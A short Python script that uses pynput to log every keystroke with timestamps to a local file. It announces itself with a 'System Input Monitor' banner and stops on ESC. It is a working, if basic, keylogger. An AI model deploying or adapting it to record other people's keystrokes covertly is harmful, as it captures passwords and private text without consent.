from pynput.keyboard import Key, Listener
import logging

# 1. Configure the logging
# This creates a file called 'keylog.txt' to save the data
log_file = "keylog.txt"

logging.basicConfig(filename=log_file, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

print(f"--- System Input Monitor Started ---")
print(f"[*] Recording keystrokes to '{log_file}'...")
print("[!] Press ESC to stop the monitor.")

def on_press(key):
    # Log the key press
    logging.info(str(key))

def on_release(key):
    # Stop the program if ESC is pressed
    if key == Key.esc:
        print("\n--- Monitor Stopped. Data saved. ---")
        return False

# 2. Start Listening
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()